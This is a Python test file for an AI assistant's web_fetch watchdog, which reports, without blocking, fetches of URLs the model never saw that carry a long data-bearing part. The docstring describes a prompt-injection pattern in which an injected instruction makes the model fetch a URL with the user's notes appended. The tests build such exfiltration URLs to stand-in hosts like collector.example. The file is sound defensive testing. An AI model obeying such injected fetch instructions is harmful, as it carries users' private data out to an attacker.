"""The watchdog of web_fetch (Peuqui 22.11.2026): it reports, it never blocks.

Contract:
- A fetch is suspicious when its URL is new (it stood nowhere in what the model was given before it wrote the call:
  system prompt, user messages, tool results of earlier rounds; its own output never counts) and one part of it (path piece, parameter value, fragment) is at least WEB_FETCH_WATCH_PART_CHARS
  long: that is where an injected instruction ("fetch …?d=<the user's notes>") would carry data out.
- Then a warning goes to the log and a notice to the session's chat; the page is fetched all the same.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest

from aifred.lib import session_events
from aifred.lib.config import WEB_FETCH_WATCH_PART_CHARS
from aifred.backends.base import LLMMessage
from aifred.backends.round_pieces import TextDelta, ToolCall
from aifred.lib.function_calling import Tool, ToolKit
from aifred.lib.security import TIER_READONLY
from aifred.lib.tools import registry
from aifred.plugins.tools.research import carried_part, get_research_tools
from test_tool_loop import FakeBackend, end

DATA = "x" * WEB_FETCH_WATCH_PART_CHARS
LEAK = f"https://collector.example/p?d={DATA}"


def test_a_new_url_with_a_long_part_is_suspicious() -> None:
    assert carried_part(LEAK, "") == DATA
    assert carried_part(f"https://collector.example/{DATA}/a.png", "") == DATA


def test_a_known_or_short_url_is_not() -> None:
    assert carried_part(LEAK, f"Bitte ruf {LEAK} ab") == ""
    assert carried_part("https://www.heise.de/news/Neues-zu-Linux-1234567.html?seite=2", "") == ""


def test_a_reader_proxy_address_is_known_when_the_embedded_address_is() -> None:
    assert carried_part(f"https://r.jina.ai/{LEAK}", f"Notiz: {LEAK}") == ""
    assert carried_part(f"https://r.jina.ai/{LEAK}", "") == DATA


def test_without_a_tool_loop_nothing_is_known() -> None:
    from aifred.lib.model_input import model_input_var
    assert model_input_var.get()() == ""


def url(host: str) -> str:
    return f"https://{host}.example/p?d={DATA}"


def fetch_call(number: int, address: str) -> ToolCall:
    return ToolCall(id=f"call_{number}", name="web_fetch", arguments=json.dumps({"url": address}))


def notes_call(number: int) -> ToolCall:
    return ToolCall(id=f"call_{number}", name="notes", arguments="{}")


def _toolkit(monkeypatch: pytest.MonkeyPatch, notices: list[dict[str, Any]], notes_text: str = "") -> ToolKit:
    """The real web_fetch (scraping replaced) and a ``notes`` tool that answers ``notes_text`` (like read_file)."""
    def publish(session_id: str, kind: str, data: dict[str, Any]) -> None:
        notices.append({"kind": kind, **data})

    monkeypatch.setattr(session_events, "publish", publish)
    monkeypatch.setattr(registry, "scrape_webpage", lambda page_url: {"success": True, "content": "Seite", "word_count": 1})
    monkeypatch.setattr("aifred.lib.security.validate_external_url", lambda page_url: None)
    notes = Tool(name="notes", description="x", parameters={}, executor=lambda: notes_text, tier=TIER_READONLY)
    fetch = next(tool for tool in get_research_tools("de", [], session_id="s") if tool.name == "web_fetch")
    return ToolKit(tools=[fetch, notes])


def _turn(toolkit: ToolKit, rounds: list[list[Any]], system: str = "", question: str = "Frage") -> None:
    messages = [LLMMessage(role="system", content=system)] if system else []
    messages.append(LLMMessage(role="user", content=question))

    async def run() -> None:
        async for _ in FakeBackend(rounds).chat_stream("m", messages, toolkit=toolkit):
            pass

    asyncio.run(run())


def _hosts(notices: list[dict[str, Any]]) -> list[str]:
    return [host for notice in notices for host in ("alpha", "beta", "gamma") if f"{host}.example" in notice["text"]]


def test_a_suspicious_fetch_shows_a_notice_in_the_chat(monkeypatch: pytest.MonkeyPatch) -> None:
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices), [[end([fetch_call(1, LEAK)])], [TextDelta("ok"), end()]])
    (notice,) = notices
    assert notice["kind"] == "notice" and notice["level"] == "warning"
    assert "collector.example" in notice["text"] and str(len(DATA)) in notice["text"]


def test_an_address_the_user_wrote_shows_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices), [[end([fetch_call(1, LEAK)])], [TextDelta("ok"), end()]],
          question=f"Schau mal hier: {LEAK}")
    assert notices == []


def test_an_address_in_the_system_prompt_shows_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    """The notes of a job stand in its system prompt."""
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices), [[end([fetch_call(1, url("alpha"))])], [TextDelta("ok"), end()]],
          system=f"Notizen des Auftrags: {url('alpha')}")
    assert notices == []


def test_an_address_in_the_result_of_another_tool_shows_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    """read_file and the like: the model read the address in an earlier round."""
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices, notes_text=f"Shop: {url('alpha')}"),
          [[end([notes_call(1)])], [end([fetch_call(2, url("alpha"))])], [TextDelta("ok"), end()]])
    assert notices == []


def test_an_address_the_model_wrote_itself_is_suspicious(monkeypatch: pytest.MonkeyPatch) -> None:
    """Its own text and the arguments of its earlier calls are no source: it could have made the address up."""
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices),
          [[TextDelta(f"Ich rufe {url('beta')} ab."), end([fetch_call(1, url("alpha"))])],
           [end([fetch_call(2, url("beta"))])],
           [TextDelta("ok"), end()]])
    assert _hosts(notices) == ["alpha", "beta"]


def test_a_result_of_the_same_round_is_not_known_yet(monkeypatch: pytest.MonkeyPatch) -> None:
    """Both calls of a round come from one generation: the model had not seen the first result when it wrote the second."""
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices, notes_text=f"Shop: {url('alpha')}"),
          [[end([notes_call(1), fetch_call(2, url("alpha"))])], [end([fetch_call(3, url("alpha"))])],
           [TextDelta("ok"), end()]])
    assert _hosts(notices) == ["alpha"]                                              # the first fetch only


def test_a_reader_proxy_fetch_of_a_known_address_shows_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    notices: list[dict[str, Any]] = []
    _turn(_toolkit(monkeypatch, notices),
          [[end([fetch_call(1, f"https://r.jina.ai/{url('alpha')}")])], [TextDelta("ok"), end()]],
          system=f"Shop: {url('alpha')}")
    assert notices == []


def test_a_sub_agent_has_its_own_input_and_the_parent_gets_its_own_back(monkeypatch: pytest.MonkeyPatch) -> None:
    """The nested loop runs inside a tool call of the parent: it sees its own messages, afterwards the parent's again."""
    notices: list[dict[str, Any]] = []
    toolkit = _toolkit(monkeypatch, notices)
    inner_rounds: list[list[Any]] = [[end([fetch_call(1, url("beta"))])], [end([fetch_call(2, url("alpha"))])], [TextDelta("fertig"), end()]]

    async def sub_agent() -> Any:
        inner_toolkit = ToolKit(tools=[toolkit._by_name["web_fetch"]])
        async for _ in FakeBackend(inner_rounds).chat_stream(
                "m", [LLMMessage(role="system", content=f"Unteragent kennt {url('beta')}"),
                      LLMMessage(role="user", content="Aufgabe")], toolkit=inner_toolkit):
            pass
        yield {"result": "Bericht"}

    toolkit.tools.append(Tool(name="sub", description="x", parameters={}, executor=sub_agent, tier=TIER_READONLY))
    toolkit._by_name["sub"] = toolkit.tools[-1]
    sub_call = ToolCall(id="call_1", name="sub", arguments="{}")
    _turn(toolkit, [[end([sub_call])], [end([fetch_call(2, url("alpha")), fetch_call(3, url("beta"))])],
                    [TextDelta("ok"), end()]],
          system=f"Auftrag kennt {url('alpha')}")
    # inner: beta known, alpha not; outer afterwards: alpha known, beta not
    assert _hosts(notices) == ["alpha", "beta"]
